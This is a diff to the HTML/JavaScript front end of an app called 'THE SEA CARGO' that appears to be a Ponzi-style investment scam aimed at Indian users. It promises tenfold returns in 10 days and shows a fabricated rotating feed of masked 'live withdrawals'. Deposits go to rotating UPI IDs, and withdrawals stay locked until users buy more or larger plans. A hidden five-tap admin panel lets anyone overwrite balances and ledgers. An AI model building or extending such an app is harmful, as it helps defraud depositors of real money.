@@ -135,18 +135,19 @@
       </div>
     </div>
   </div>
-
-  <!-- ================= 2. MAIN APPLICATION ================= -->
+    <!-- ================= 2. MAIN APPLICATION ================= -->
   <div id="mainDashboard" class="hidden max-w-md mx-auto">
-    <!-- Top Header -->
-    <header class="sticky top-0 z-40 bg-[#030712]/95 backdrop-blur-md border-b border-white/10 px-4 py-3 flex justify-between items-center">
-      <h1 class="text-sm font-black text-white tracking-wider font-luxury uppercase">THE SEA CARGO</h1>
+    <!-- Top Header (Tap 5 times continuously on logo to trigger Admin Audit Desk) -->
+    <header class="sticky top-0 z-40 bg-[#030712]/95 backdrop-blur-md border-b border-white/10 px-4 py-3 flex justify-between items-center select-none">
+      <h1 onclick="handleAdminSecretTap()" class="text-sm font-black text-white tracking-wider font-luxury uppercase cursor-pointer">
+        THE SEA CARGO
+      </h1>
       
       <div class="flex items-center gap-2">
         <span class="bg-[#003822]/60 border border-[#00f589]/40 text-[#00f589] text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center gap-1.5">
           <span class="w-1.5 h-1.5 rounded-full bg-[#00f589] animate-pulse"></span> Terminal Connected
         </span>
-        <span class="bg-[#241a04] border border-[#d4af37]/60 text-[#ffd000] text-[10px] font-black px-2.5 py-1 rounded-lg flex items-center gap-1 shadow-sm">
+        <span id="topVipBadge" class="bg-[#241a04] border border-[#d4af37]/60 text-[#ffd000] text-[10px] font-black px-2.5 py-1 rounded-lg flex items-center gap-1 shadow-sm">
           <i class="fa-solid fa-crown text-[9px]"></i> VIP
         </span>
         <button class="text-gray-300 text-lg ml-1">
@@ -154,7 +155,8 @@
         </button>
       </div>
     </header>
-        <main class="p-3.5 space-y-4">
+
+    <main class="p-3.5 space-y-4">
       <!-- SECTION: HOMEPAGE -->
       <section id="sec-home" class="space-y-4">
         <!-- CONTINUOUSLY AUTO-ROTATING MASKED LIVE WITHDRAWALS -->
@@ -739,7 +741,7 @@
         </div>
       </section>
 
-      <!-- SECTION: ACCOUNT -->
+      <!-- SECTION: ACCOUNT (WITH DYNAMIC VIP TIER BADGE) -->
       <section id="sec-account" class="hidden space-y-4">
         <div class="bg-[#080d1a] p-4 rounded-2xl border border-white/10 flex items-center justify-between">
           <div class="flex items-center gap-3">
@@ -747,13 +749,25 @@
               <i class="fa-solid fa-user-astronaut"></i>
             </div>
             <div>
-              <h3 id="accUsername" class="text-sm font-black text-white">Investor</h3>
-              <p id="accPhone" class="text-xs text-gray-400 font-mono">+91 **********</p>
+              <div class="flex items-center gap-2">
+                <h3 id="accUsername" class="text-sm font-black text-white">Investor</h3>
+                <span id="accVipPill" class="text-[9px] font-black px-2 py-0.5 rounded-md uppercase tracking-wider bg-white/10 text-gray-400 border border-white/10">Standard Tier</span>
+              </div>
+              <p id="accPhone" class="text-xs text-gray-400 font-mono mt-0.5">+91 **********</p>
             </div>
           </div>
           <button onclick="handleLogout()" class="text-xs text-red-400 hover:text-red-300 font-bold bg-red-500/10 border border-red-500/20 px-3 py-1.5 rounded-xl active:scale-95 transition">
             Logout
           </button>
+        </div>
+
+        <!-- VIP Membership Status Card -->
+        <div id="vipStatusCard" class="bg-gradient-to-r from-[#121927] to-[#080e1b] p-3.5 rounded-2xl border border-white/10 flex justify-between items-center">
+          <div>
+            <span class="text-[9px] text-gray-400 uppercase font-bold block">Account Clearance Level</span>
+            <h4 id="vipTierTitle" class="text-xs font-black text-gray-300 uppercase mt-0.5">Standard Investor</h4>
+          </div>
+          <span id="vipTierActionBtn" class="text-[10px] font-black text-orange-400 bg-orange-500/10 border border-orange-500/30 px-2.5 py-1 rounded-lg">Upgrade to VIP</span>
         </div>
 
         <div class="bg-[#080d1a] p-4 rounded-2xl border border-white/10 space-y-3 text-xs">
@@ -809,10 +823,9 @@
       </div>
     </nav>
   </div>
+    <!-- ================= 3. POPUP MODALS ================= -->
 
-  <!-- ================= 3. POPUP MODALS ================= -->
-
-  <!-- RECHARGE / DEPOSIT MODAL WITH REALISTIC BIG UPI APPS (NO RAW TEXT UPI ID) -->
+  <!-- RECHARGE / DEPOSIT MODAL WITH DIRECT UPI APPS & PAYMENT SCREENSHOT SLIP PICKER -->
   <div id="rechargeModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
     <div class="bg-[#080d1a] border border-orange-500/30 rounded-3xl p-5 w-full max-w-sm space-y-4 max-h-[90vh] overflow-y-auto shadow-2xl">
       <div class="flex justify-between items-center border-b border-white/10 pb-3">
@@ -892,12 +905,23 @@
         </button>
       </div>
 
-      <!-- Deposit Submission Form -->
+      <!-- Deposit Submission Form with Slip Picker -->
       <div class="space-y-3 pt-2 border-t border-white/10">
         <div>
           <label class="text-[10px] uppercase font-bold text-gray-400">12-Digit Bank UTR / Reference No.</label>
-          <input id="depUtr" type="text" maxlength="12" placeholder="e.g. 4328XXXXXXXX" class="w-full mt-1 bg-[#030712] border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white font-mono outline-none focus:border-[#ff7b00]">
+          <input id="depUtr" type="text" maxlength="12" placeholder="e.g. 4328XXXXXXXX" class="w-full mt-1 bg-[#030712] border border-white/10 rounded-xl px-3.5 py-2 text-xs text-white font-mono outline-none focus:border-[#ff7b00]">
         </div>
+
+        <!-- SCREENSHOT UPLOAD FILE PICKER -->
+        <div>
+          <label class="text-[10px] uppercase font-bold text-gray-400 block mb-1">Attach Payment Screenshot / Receipt</label>
+          <label class="flex flex-col items-center justify-center border border-dashed border-white/20 rounded-xl p-3 cursor-pointer bg-[#030712] hover:border-orange-500/50 transition">
+            <i class="fa-solid fa-cloud-arrow-up text-orange-400 text-lg mb-1"></i>
+            <span id="slipFileName" class="text-[10px] text-gray-300 font-medium">Click to select screenshot image</span>
+            <input type="file" id="depSlipInput" accept="image/*" class="hidden" onchange="handleSlipSelection(this)">
+          </label>
+        </div>
+
         <button onclick="submitDeposit()" class="w-full bg-gradient-to-r from-[#ff6b00] to-[#ffd000] text-black font-black py-3 rounded-xl text-xs active:scale-95 transition uppercase tracking-wider shadow-lg">
           Submit Deposit Receipt
         </button>
@@ -972,9 +996,55 @@
       </div>
     </div>
   </div>
+
+  <!-- ENHANCED ADMIN / AUDIT CONTROL PANEL MODAL -->
+  <div id="adminPanelModal" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
+    <div class="bg-[#080d1a] border-2 border-[#00f589]/40 rounded-3xl p-5 w-full max-w-sm space-y-4 max-h-[85vh] overflow-y-auto shadow-2xl">
+      <div class="flex justify-between items-center border-b border-white/10 pb-3">
+        <h3 class="text-xs font-black text-white uppercase tracking-wider flex items-center gap-2">
+          <i class="fa-solid fa-shield-halved text-[#00f589]"></i> Audit & Settlement Desk
+        </h3>
+        <button onclick="closeModal('adminPanelModal')" class="text-gray-400 hover:text-white text-sm">✕</button>
+      </div>
+
+      <!-- Pending Verifications Section -->
+      <div class="space-y-2">
+        <div class="flex justify-between items-center">
+          <span class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Pending Deposits Verification</span>
+          <span id="adminPendingCount" class="text-[9px] font-black text-orange-400 bg-orange-500/10 border border-orange-500/30 px-2 py-0.5 rounded-full">0 Pending</span>
+        </div>
+        <div id="adminPendingQueue" class="space-y-2 text-xs">
+          <p class="text-gray-500 text-center py-3 text-[11px]">No deposits awaiting verification.</p>
+        </div>
+      </div>
+
+      <!-- Manual Overrides Section -->
+      <div class="pt-3 border-t border-white/10 space-y-3 text-xs">
+        <div>
+          <label class="text-[10px] uppercase font-bold text-gray-400">Manual Balance Adjustment (₹)</label>
+          <div class="flex gap-2 mt-1">
+            <input id="adminBalanceInput" type="number" placeholder="Enter amount" class="w-full bg-[#030712] border border-white/10 rounded-xl px-3 py-2 text-white font-mono outline-none focus:border-[#00f589]">
+            <button onclick="adminSetBalance()" class="bg-[#00f589] text-black font-black px-4 py-2 rounded-xl text-xs active:scale-95">Set</button>
+          </div>
+        </div>
+
+        <div class="pt-2 border-t border-white/5 space-y-2">
+          <p class="text-[10px] uppercase font-bold text-gray-400">Security Overrides</p>
+          <div class="grid grid-cols-2 gap-2">
+            <button onclick="adminToggleVip()" class="bg-yellow-500/20 border border-yellow-500/40 text-[#ffd000] font-bold py-2 rounded-xl text-[10px] active:scale-95">
+              Toggle VIP Force
+            </button>
+            <button onclick="adminClearTx()" class="bg-red-500/20 border border-red-500/40 text-red-400 font-bold py-2 rounded-xl text-[10px] active:scale-95">
+              Clear Ledgers
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
     <!-- ================= 4. APPLICATION JAVASCRIPT ================= -->
   <script>
-    // State management with Persistent User Store
+    // State management with Persistent Storage
     const state = {
       user: null,
       balance: 100.0,
@@ -983,11 +1053,16 @@
       totalInvested: 0.0,
       dailyIncome: 0.0,
       activePlans: [],
-      transactions: []
+      transactions: [],
+      adminForceVip: false
     };
 
-    // Registered Users Store (Simulated Local Storage Database)
+    // Registered Users Store (Local storage simulation)
     const registeredUsers = JSON.parse(localStorage.getItem('seaCargoUsers') || '{}');
+
+    // UTR and Pending Verification Store
+    let usedUtrDatabase = JSON.parse(localStorage.getItem('seaCargoUsedUtrs') || '[]');
+    let pendingDeposits = JSON.parse(localStorage.getItem('seaCargoPendingDeposits') || '[]');
 
     // 8 Plans Reference Database with 10-day Contract
     const FLEET_PLANS = [
@@ -1001,7 +1076,7 @@
       { id: 8, planNo: "Plan 8", title: "Container Liner", price: 2500, daily: 2500, total: 25000 }
     ];
 
-    // DUAL DYNAMIC ROTATING UPI IDS (Background Rotation without revealing raw ID on UI)
+    // DUAL DYNAMIC ROTATING UPI IDS (Background Rotation)
     const UPI_IDS = ["thesolarinvest1@ybl", "thecargo@slc"];
     let upiRotateIndex = 0;
 
@@ -1011,8 +1086,38 @@
       return selectedVpa;
     }
 
+    // AUDIO FEEDBACK SYNTHESIZER (Terminal Chime via Web Audio API)
+    function playTerminalChime(type = 'success') {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+
+        const now = audioCtx.currentTime;
+        if (type === 'success') {
+          osc.frequency.setValueAtTime(587.33, now); // D5
+          osc.frequency.exponentialRampToValueAtTime(880, now + 0.15); // A5
+          gain.gain.setValueAtTime(0.12, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
+          osc.start(now);
+          osc.stop(now + 0.35);
+        } else if (type === 'bonus') {
+          osc.frequency.setValueAtTime(523.25, now); // C5
+          osc.frequency.setValueAtTime(659.25, now + 0.08); // E5
+          osc.frequency.setValueAtTime(783.99, now + 0.16); // G5
+          gain.gain.setValueAtTime(0.15, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+          osc.start(now);
+          osc.stop(now + 0.4);
+        }
+      } catch (e) {
+        // Fallback silently if audio context unavailable
+      }
+    }
+
     // CONTINUOUS ROTATING MASKED LIVE WITHDRAWALS ENGINE
-    // Format: First letter + asterisks + last letter
     const maskedNames = [
       "R*****h", "V*****m", "A***y", "S*****a", "D****k", 
       "M***j", "P***a", "R***t", "S****h", "A***t", 
@@ -1077,10 +1182,75 @@
 
       window.location.href = appUrl;
 
-      // Fallback intent
       setTimeout(() => {
         window.location.href = `upi://pay?${upiParams}`;
       }, 700);
+    }
+
+    // SCREENSHOT FILE SELECTION DISPLAY HANDLER
+    function handleSlipSelection(input) {
+      const label = document.getElementById("slipFileName");
+      if (input.files && input.files[0]) {
+        label.innerText = `Selected: ${input.files[0].name}`;
+        label.classList.add("text-[#00f589]");
+      }
+    }
+
+    // 24-HOUR AUTOMATED DIVIDEND PAYOUT ENGINE
+    const CYCLE_DURATION_MS = 24 * 60 * 60 * 1000; // 24 Hours
+
+    function processPlanPayouts() {
+      const now = Date.now();
+      let updated = false;
+
+      state.activePlans.forEach(plan => {
+        if (plan.payoutsClaimed >= 10) return; // 10 days complete
+
+        const elapsed = now - plan.lastPayoutTime;
+        if (elapsed >= CYCLE_DURATION_MS) {
+          const cyclesToPay = Math.min(
+            Math.floor(elapsed / CYCLE_DURATION_MS),
+            10 - plan.payoutsClaimed
+          );
+
+          if (cyclesToPay > 0) {
+            const addedIncome = plan.daily * cyclesToPay;
+            state.balance += addedIncome;
+            plan.payoutsClaimed += cyclesToPay;
+            plan.lastPayoutTime += (cyclesToPay * CYCLE_DURATION_MS);
+
+            state.transactions.unshift({
+              type: '24H Dividend Credited',
+              name: `${plan.planNo} Daily Return (${cyclesToPay}x)`,
+              amount: addedIncome,
+              time: 'Just now'
+            });
+            updated = true;
+          }
+        }
+      });
+
+      if (updated) {
+        playTerminalChime('bonus');
+        updateUI();
+      }
+    }
+
+    function formatTimeRemaining(ms) {
+      if (ms <= 0) return "00h 00m 00s";
+      const totalSeconds = Math.floor(ms / 1000);
+      const hours = Math.floor(totalSeconds / 3600);
+      const minutes = Math.floor((totalSeconds % 3600) / 60);
+      const seconds = totalSeconds % 60;
+      return `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
+    }
+
+    // VIP Qualification Engine (Either two 350 plans OR at least one 500+ plan)
+    function isUserVipQualified() {
+      if (state.adminForceVip) return true;
+      const tier350Count = state.activePlans.filter(p => p.price === 350).length;
+      const hasVipPlan = state.activePlans.some(p => p.price >= 500);
+      return tier350Count >= 2 || hasVipPlan;
     }
 
     // Buy Fleet Plan Action
@@ -1097,11 +1267,16 @@
       state.balance -= plan.price;
       state.totalInvested += plan.price;
       state.dailyIncome += plan.daily;
+
+      const now = Date.now();
       state.activePlans.push({
         ...plan,
-        boughtAt: Date.now(),
-        daysLeft: 10
+        instanceId: 'plan_' + now + '_' + Math.random().toString(36).substr(2, 4),
+        boughtAt: now,
+        lastPayoutTime: now,
+        payoutsClaimed: 0
       });
+
       state.transactions.unshift({
         type: 'Fleet Allocation',
         name: `${plan.planNo} - ${plan.title}`,
@@ -1109,8 +1284,9 @@
         time: 'Just now'
       });
 
+      playTerminalChime('success');
       updateUI();
-      alert(`Successfully allocated: ${plan.planNo} (${plan.title})!`);
+      alert(`Allocated: ${plan.planNo} (${plan.title})! First 24-hour dividend cycle active.`);
     }
 
     // WITHDRAWAL VALIDATION ENGINE (VIP GATE REQUIREMENT)
@@ -1124,11 +1300,7 @@
         return;
       }
 
-      // Check: Either two ₹350 plans OR at least one ₹500+ VIP plan
-      const tier350Count = state.activePlans.filter(p => p.price === 350).length;
-      const hasVipPlan = state.activePlans.some(p => p.price >= 500);
-
-      if (tier350Count < 2 && !hasVipPlan) {
+      if (!isUserVipQualified()) {
         closeModal('withdrawModal');
         openModal('vipNoticeModal');
         return;
@@ -1148,38 +1320,162 @@
         time: 'Processing'
       });
 
+      playTerminalChime('success');
       closeModal('withdrawModal');
       updateUI();
       alert("Withdrawal authorized successfully! Funds will credit within maritime clearing schedule.");
     }
-
-    // Deposit Submission
+        // SECURE DEPOSIT SUBMISSION HANDLER WITH UTR & DUPLICATE CHECKS
     function submitDeposit() {
-      const amt = parseFloat(document.getElementById("depAmount").value);
-      const utr = document.getElementById("depUtr").value.trim();
+      const amtInput = document.getElementById("depAmount");
+      const utrInput = document.getElementById("depUtr");
+      const slipInput = document.getElementById("depSlipInput");
 
-      if (isNaN(amt) || amt < 350 || utr.length !== 12) {
-        alert("Please enter a valid amount (min ₹350) and full 12-digit UTR reference.");
+      const amt = parseFloat(amtInput.value);
+      const utr = utrInput.value.trim();
+
+      if (isNaN(amt) || amt < 350) {
+        alert("Verification Failure: Minimum deposit value is ₹350.00.");
         return;
       }
 
-      state.balance += amt;
-      state.totalDeposited += amt;
-      state.transactions.unshift({
-        type: 'Capital Deposit',
-        name: `UTR: ${utr}`,
+      const utrRegex = /^\d{12}$/;
+      if (!utrRegex.test(utr)) {
+        alert("Invalid UTR Format: An authentic Indian banking UTR must consist of exactly 12 numeric digits.");
+        return;
+      }
+
+      if (usedUtrDatabase.includes(utr)) {
+        alert("UTR Duplicate Rejected: This banking reference number has already been submitted or cleared in the ledger.");
+        return;
+      }
+
+      if (!slipInput.files || slipInput.files.length === 0) {
+        alert("Payment Slip Missing: You must upload the official payment receipt screenshot before routing to clearing.");
+        return;
+      }
+
+      const fileName = slipInput.files[0].name;
+
+      // Register used UTR
+      usedUtrDatabase.push(utr);
+      localStorage.setItem('seaCargoUsedUtrs', JSON.stringify(usedUtrDatabase));
+
+      const newRecord = {
+        id: 'DEP_' + Date.now(),
+        utr: utr,
         amount: amt,
-        time: 'Just now'
+        slip: fileName,
+        status: 'PENDING',
+        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+      };
+
+      pendingDeposits.unshift(newRecord);
+      localStorage.setItem('seaCargoPendingDeposits', JSON.stringify(pendingDeposits));
+
+      state.transactions.unshift({
+        type: 'Deposit (Pending)',
+        name: `UTR: ${utr} (${fileName})`,
+        amount: amt,
+        status: 'PENDING',
+        time: 'Under Verification'
       });
 
+      utrInput.value = "";
+      slipInput.value = "";
+      document.getElementById("slipFileName").innerText = "Click to select screenshot image";
+      document.getElementById("slipFileName").classList.remove("text-[#00f589]");
+
+      playTerminalChime('success');
       closeModal('rechargeModal');
       updateUI();
-      alert(`Deposit receipt of ₹${amt} verified and credited to Settled Capital!`);
+
+      alert(`Deposit request for ₹${amt.toFixed(2)} submitted!\n\nStatus: UNDER BANKING CLEARANCE\nFunds will credit as soon as the reference matches institutional clearing.`);
+    }
+
+    // ADMIN AUDIT DESK CONTROLS
+    function adminApproveDeposit(id) {
+      const idx = pendingDeposits.findIndex(d => d.id === id);
+      if (idx === -1) return;
+
+      const record = pendingDeposits[idx];
+      state.balance += record.amount;
+      state.totalDeposited += record.amount;
+
+      const tx = state.transactions.find(t => t.name.includes(record.utr));
+      if (tx) {
+        tx.type = 'Capital Deposit';
+        tx.time = 'Approved by Clearing';
+        tx.status = 'APPROVED';
+      }
+
+      pendingDeposits.splice(idx, 1);
+      localStorage.setItem('seaCargoPendingDeposits', JSON.stringify(pendingDeposits));
+
+      playTerminalChime('bonus');
+      updateUI();
+      alert(`UTR ${record.utr} approved! ₹${record.amount.toFixed(2)} credited to user balance.`);
+    }
+
+    function adminRejectDeposit(id) {
+      const idx = pendingDeposits.findIndex(d => d.id === id);
+      if (idx === -1) return;
+
+      const record = pendingDeposits[idx];
+
+      const tx = state.transactions.find(t => t.name.includes(record.utr));
+      if (tx) {
+        tx.type = 'Deposit Rejected';
+        tx.time = 'Failed Audit / Cancelled';
+        tx.amount = 0;
+        tx.status = 'REJECTED';
+      }
+
+      pendingDeposits.splice(idx, 1);
+      localStorage.setItem('seaCargoPendingDeposits', JSON.stringify(pendingDeposits));
+
+      playTerminalChime('success');
+      updateUI();
+      alert(`UTR ${record.utr} flagged as invalid/fake. Record cancelled and zero balance added.`);
+    }
+
+    function renderAdminPendingQueue() {
+      const queue = document.getElementById("adminPendingQueue");
+      const count = document.getElementById("adminPendingCount");
+      if (!queue || !count) return;
+
+      count.innerText = `${pendingDeposits.length} Pending`;
+
+      if (pendingDeposits.length === 0) {
+        queue.innerHTML = `<p class="text-gray-500 text-center py-3 text-[11px]">No deposits awaiting verification.</p>`;
+        return;
+      }
+
+      queue.innerHTML = pendingDeposits.map(d => `
+        <div class="bg-[#030712] p-2.5 rounded-xl border border-white/5 space-y-1.5 fade-item">
+          <div class="flex justify-between items-start">
+            <div>
+              <p class="font-mono text-white text-xs font-bold">UTR: ${d.utr}</p>
+              <p class="text-[9px] text-gray-400">${d.slip} • ${d.timestamp}</p>
+            </div>
+            <span class="text-xs font-black text-[#00f589] font-mono">₹${d.amount.toFixed(2)}</span>
+          </div>
+          <div class="grid grid-cols-2 gap-2 pt-1">
+            <button onclick="adminApproveDeposit('${d.id}')" class="bg-[#00f589] text-black font-black py-1.5 rounded-lg text-[10px] active:scale-95 shadow">
+              ✓ Match & Credit
+            </button>
+            <button onclick="adminRejectDeposit('${d.id}')" class="bg-red-500/20 border border-red-500/40 text-red-400 font-bold py-1.5 rounded-lg text-[10px] active:scale-95">
+              ✕ Reject Fake
+            </button>
+          </div>
+        </div>
+      `).join("");
     }
 
     // Daily Harbor Check-In
     function dailyCheckIn() {
       state.balance += 10;
+      playTerminalChime('bonus');
       updateUI();
       const btn = document.getElementById("btnCheckin");
       if (btn) {
@@ -1190,7 +1486,40 @@
       alert("Daily harbor dividend of ₹10 credited!");
     }
 
-    // Update UI elements & Active Fleet Countdowns
+    // Live Render for Countdown Timers
+    function renderFleetCountdowns() {
+      const plansList = document.getElementById("myPlansList");
+      if (!plansList) return;
+
+      if (state.activePlans.length === 0) {
+        plansList.innerHTML = `<p class="text-gray-500 text-center py-4">No active fleets allocated yet.</p>`;
+        return;
+      }
+
+      const now = Date.now();
+      plansList.innerHTML = state.activePlans.map(p => {
+        const nextPayout = p.lastPayoutTime + CYCLE_DURATION_MS;
+        const remainingMs = Math.max(0, nextPayout - now);
+        const timeText = p.payoutsClaimed >= 10 ? "10 Days Completed" : formatTimeRemaining(remainingMs);
+
+        return `
+          <div class="bg-[#030712] p-3 rounded-2xl border border-white/5 flex justify-between items-center fade-item">
+            <div>
+              <p class="font-bold text-white text-xs">${p.planNo} - ${p.title}</p>
+              <p class="text-[10px] text-[#00f589] font-mono mt-0.5">Daily Dividend: ₹${p.daily}.00</p>
+              <span class="text-[9px] text-[#ffd000] font-mono block mt-0.5 font-bold">
+                ⏱ Next Dividend in: ${timeText} (${p.payoutsClaimed}/10 Days)
+              </span>
+            </div>
+            <span class="text-[9px] bg-orange-500/20 text-orange-400 border border-orange-500/30 px-2 py-1 rounded-lg font-mono font-bold">
+              24H Cycle
+            </span>
+          </div>
+        `;
+      }).join("");
+    }
+
+    // Update UI Elements and Badges
     function updateUI() {
       const bal = document.getElementById("balanceDisplay");
       const ledgerBal = document.getElementById("ledgerBalanceDisplay");
@@ -1204,24 +1533,37 @@
       if (wth) wth.innerText = `₹ ${state.totalWithdrawn.toFixed(2)}`;
       if (count) count.innerText = `${state.activePlans.length} Active`;
 
-      // Update Ledger Active Plans with Live Countdown
-      const plansList = document.getElementById("myPlansList");
-      if (plansList) {
-        if (state.activePlans.length > 0) {
-          plansList.innerHTML = state.activePlans.map(p => `
-            <div class="bg-[#030712] p-3 rounded-2xl border border-white/5 flex justify-between items-center">
-              <div>
-                <p class="font-bold text-white text-xs">${p.planNo} - ${p.title}</p>
-                <p class="text-[10px] text-[#00f589] font-mono mt-0.5">Daily Dividend: ₹${p.daily}</p>
-                <span class="text-[9px] text-[#ffd000] font-mono block mt-0.5">⏱ Next Dividend in: 14h 22m 10s</span>
-              </div>
-              <span class="text-[9px] bg-orange-500/20 text-orange-400 px-2.5 py-1 rounded-lg font-mono">10 Days Term</span>
-            </div>
-          `).join("");
+      // Update VIP Badge in Top Bar and Account Tab
+      const isVip = isUserVipQualified();
+      const topBadge = document.getElementById("topVipBadge");
+      const accPill = document.getElementById("accVipPill");
+      const tierTitle = document.getElementById("vipTierTitle");
+      const tierActionBtn = document.getElementById("vipTierActionBtn");
+
+      if (topBadge && accPill && tierTitle && tierActionBtn) {
+        if (isVip) {
+          topBadge.className = "bg-gradient-to-r from-[#ffd000] to-[#ff7b00] text-black text-[10px] font-black px-2.5 py-1 rounded-lg flex items-center gap-1 shadow-md animate-pulse";
+          topBadge.innerHTML = `<i class="fa-solid fa-crown text-[9px]"></i> VIP ACTIVE`;
+          accPill.className = "text-[9px] font-black px-2 py-0.5 rounded-md uppercase tracking-wider bg-[#ffd000]/20 text-[#ffd000] border border-[#ffd000]/40";
+          accPill.innerText = "VIP Elite Member";
+          tierTitle.className = "text-xs font-black text-[#ffd000] uppercase mt-0.5 font-luxury";
+          tierTitle.innerText = "Institutional VIP Tier Active";
+          tierActionBtn.className = "text-[10px] font-black text-[#00f589] bg-[#00f589]/10 border border-[#00f589]/30 px-2.5 py-1 rounded-lg";
+          tierActionBtn.innerText = "Unlocked ✓";
         } else {
-          plansList.innerHTML = `<p class="text-gray-500 text-center py-4">No active fleets allocated yet.</p>`;
+          topBadge.className = "bg-[#241a04] border border-[#d4af37]/60 text-[#ffd000] text-[10px] font-black px-2.5 py-1 rounded-lg flex items-center gap-1 shadow-sm";
+          topBadge.innerHTML = `<i class="fa-solid fa-crown text-[9px]"></i> VIP`;
+          accPill.className = "text-[9px] font-black px-2 py-0.5 rounded-md uppercase tracking-wider bg-white/10 text-gray-400 border border-white/10";
+          accPill.innerText = "Standard Tier";
+          tierTitle.className = "text-xs font-black text-gray-300 uppercase mt-0.5";
+          tierTitle.innerText = "Standard Investor";
+          tierActionBtn.className = "text-[10px] font-black text-orange-400 bg-orange-500/10 border border-orange-500/30 px-2.5 py-1 rounded-lg cursor-pointer";
+          tierActionBtn.innerText = "Upgrade to VIP";
         }
       }
+
+      renderFleetCountdowns();
+      renderAdminPendingQueue();
 
       // Update Ledger History
       const txList = document.getElementById("txHistoryList");
@@ -1233,8 +1575,8 @@
                 <p class="font-bold text-white text-[11px]">${t.type}</p>
                 <p class="text-[9px] text-gray-500">${t.name} • ${t.time}</p>
               </div>
-              <span class="font-black text-xs ${t.amount > 0 ? 'text-[#00f589]' : 'text-orange-400'} font-mono">
-                ${t.amount > 0 ? '+' : ''}₹${Math.abs(t.amount)}
+              <span class="font-black text-xs ${t.amount > 0 ? (t.status === 'PENDING' ? 'text-yellow-400' : 'text-[#00f589]') : (t.status === 'REJECTED' ? 'text-red-400' : 'text-orange-400')} font-mono">
+                ${t.status === 'PENDING' ? '⏳ ₹' + t.amount : (t.status === 'REJECTED' ? '✕ Void' : (t.amount > 0 ? '+' : '') + '₹' + Math.abs(t.amount))}
               </span>
             </div>
           `).join("");
@@ -1273,6 +1615,7 @@
       localStorage.setItem('seaCargoUsers', JSON.stringify(registeredUsers));
 
       state.user = { name: user, phone: phone };
+      playTerminalChime('success');
       alert("Account created successfully! Logging you in...");
       startApp();
     }
@@ -1299,6 +1642,7 @@
       }
 
       state.user = { name: account.name, phone: phone };
+      playTerminalChime('success');
       startApp();
     }
 
@@ -1318,6 +1662,7 @@
 
       registeredUsers[phone].password = newPass;
       localStorage.setItem('seaCargoUsers', JSON.stringify(registeredUsers));
+      playTerminalChime('success');
       alert("Password updated successfully! You can now log in.");
       closeModal('forgotModal');
     }
@@ -1358,7 +1703,46 @@
     function copyRefLink() {
       const link = document.getElementById("refLinkText").innerText;
       navigator.clipboard.writeText(link);
+      playTerminalChime('success');
       alert("Institutional partner link copied!");
+    }
+
+    // 5-TAP SECRET ADMIN TRIGGER
+    let adminTapCount = 0;
+    let adminTapTimer = null;
+    function handleAdminSecretTap() {
+      adminTapCount++;
+      clearTimeout(adminTapTimer);
+      adminTapTimer = setTimeout(() => { adminTapCount = 0; }, 1800);
+      
+      if (adminTapCount >= 5) {
+        adminTapCount = 0;
+        playTerminalChime('bonus');
+        openModal('adminPanelModal');
+      }
+    }
+
+    function adminSetBalance() {
+      const val = parseFloat(document.getElementById("adminBalanceInput").value);
+      if (!isNaN(val)) {
+        state.balance = val;
+        updateUI();
+        playTerminalChime('success');
+        alert(`Balance overridden to ₹${val.toFixed(2)}`);
+      }
+    }
+
+    function adminToggleVip() {
+      state.adminForceVip = !state.adminForceVip;
+      updateUI();
+      playTerminalChime('bonus');
+      alert(`Admin Force VIP set to: ${state.adminForceVip}`);
+    }
+
+    function adminClearTx() {
+      state.transactions = [];
+      updateUI();
+      alert("Ledger records cleared.");
     }
 
     function openModal(id) { 
@@ -1370,10 +1754,16 @@
       if (el) el.classList.add("hidden"); 
     }
 
-    // Initialization
+    // Initialization & Background Interval Loops
     window.addEventListener("DOMContentLoaded", () => {
       updateLiveWithdrawals();
-      setInterval(updateLiveWithdrawals, 2500); // Continuous masked rotation every 2.5s
+      setInterval(updateLiveWithdrawals, 2500); // Masked withdrawal rotation every 2.5s
+      
+      // Real-time 24h timer update & dividend trigger loop every 1 second
+      setInterval(() => {
+        processPlanPayouts();
+        renderFleetCountdowns();
+      }, 1000);
     });
   </script>
 </body>
